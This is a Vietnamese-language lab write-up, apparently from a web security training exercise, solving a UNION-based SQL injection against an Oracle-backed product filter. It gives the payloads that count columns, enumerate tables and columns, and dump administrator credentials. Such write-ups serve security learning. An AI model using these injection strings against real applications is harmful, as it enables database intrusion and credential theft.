# Đầu bài cho biết:
- Ứng dụng có lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm.
- Sử dụng tấn công UNION.
- Ứng dụng có chức năng đăng nhập, và cơ sở dữ liệu chứa một bảng lưu trữ tên người dùng và mật khẩu.
- Hệ thống sử dụng cơ sở dữ liệu Oracle.

# Yêu cầu:
- Xác định tên của bảng chứa thông tin người dùng và tên các cột của bảng đó.
- Truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng.
- Đăng nhập với tư cách người dùng `administrator`.

# Solution

- Dùng  ORDER BY để đếm số cột

`' ORDER BY 1--`

`' ORDER BY 2--`

`' ORDER BY 3--` => Lỗi

- Vậy là có 2 cột
- Đầu bài đã cho biết hệ thống sử dụng cơ sở dữ liệu Oracle
- Thử lại bằng `UNION SELECT`

`' UNION SELECT NULL, NULL FROM dual--`

![image](https://github.com/user-attachments/assets/f042ff7f-a1f8-4fe1-bfe6-92dcd9547923)

- Thử định dạng

`' UNION SELECT 'a', 'a' FROM dual--`

- Vậy là tại cả 2 cột đều là định dạng chuỗi
- Ta xem tên tất cả các bảng bằng `all_tables` trong Oracle

`' UNION SELECT NULL, NULL FROM all_tables--`

![image](https://github.com/user-attachments/assets/5504238d-2f17-43b9-a991-0156acf6c873)

`' UNION SELECT TABLE_NAME, NULL FROM all_tables--`

![image](https://github.com/user-attachments/assets/472c81c5-6444-42a5-ab32-f641808dd54d)

- Ta tìm được bảng `USERS_BOWBLO`
- Ta tìm được tên bảng, bây giờ cần tìm tên các cột trong bảng, ta có thể dùng `FROM all_tab_columns`

![image](https://github.com/user-attachments/assets/1764f46e-7296-4e28-ac88-9f771be81541)

- Vậy thì ta có chuỗi truyền vào là: `'UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = 'USERS_BOWBLO'--`

![image](https://github.com/user-attachments/assets/4b633082-f441-4483-b85c-3bcbef330dae)

- Ta kiếm được 3 cột là: `EMAIL`, `PASSWORD_JAAJKL`, `USERNAME_MHOMZQ`
- Giờ, ta đã tên 2 cột username, pass và tên bảng thì ta hoàn toàn có thể in ra giá trị của các user và pass
- `' UNION SELECT USERNAME_MHOMZQ, PASSWORD_JAAJKL FROM USERS_BOWBLO--`

![image](https://github.com/user-attachments/assets/2b27c9c7-99c4-4cc1-a507-5b3bc9132b4d)

- Đăng nhập vào tài khoản admin và hoàn thành lab
